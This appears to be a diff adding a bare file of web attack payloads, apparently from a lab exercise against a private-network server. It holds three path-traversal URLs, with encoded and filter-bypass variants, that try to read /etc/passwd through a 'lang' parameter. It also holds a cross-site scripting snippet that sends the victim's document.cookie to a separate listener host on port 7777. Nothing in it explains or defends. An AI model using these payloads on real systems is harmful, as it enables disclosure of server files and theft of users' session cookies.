@@ -1,0 +1,11 @@
+http://192.168.47.174/index.php?lang=%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2Fetc%2Fpasswd
+
+http://192.168.47.174/index.php?lang=...././/...././/...././/...././/etc/passwd
+
+http://192.168.47.174/index.php?lang=../../../../etc/passwd
+
+<script>
+var img = document.createElement("img"); 
+img.src="http://192.168.47.152:7777" + "/cookie=" + encodeURIComponent(document.cookie);
+document.body.appendChild(img);
+</script>
